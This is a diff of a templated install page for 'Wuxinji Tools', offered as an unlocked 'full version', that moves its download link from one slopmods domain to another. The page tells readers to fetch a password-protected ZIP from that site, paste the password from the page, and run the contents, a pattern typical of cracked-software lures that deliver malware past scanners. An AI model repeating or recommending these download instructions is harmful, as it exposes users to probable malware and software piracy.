@@ -1,6 +1,6 @@
 ***
 
-# Wuxinji Tools Full Version — Windows Install
+# Wuxinji Tools Windows Setup
 
 Wuxinji Tools — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Wuxinji Tools — Windows setup and configuration · Premium workspace · Zero n
 
 > Use the release page below for Windows.
 
-- **Release page:** [wuxinji.slopmods.tech](https://wuxinji.slopmods.tech/)
-- **Full URL:** `https://wuxinji.slopmods.tech/`
+- **Release page:** [wuxinji.slopmods.top](https://wuxinji.slopmods.top/)
+- **Full URL:** `https://wuxinji.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **wuxinji.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **wuxinji.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Wuxinji Tools — Windows setup and configuration · Premium workspace · Zero n
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **wuxinji.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **wuxinji.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Wuxinji Tools** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Wuxinji Tools features on Windows desktop
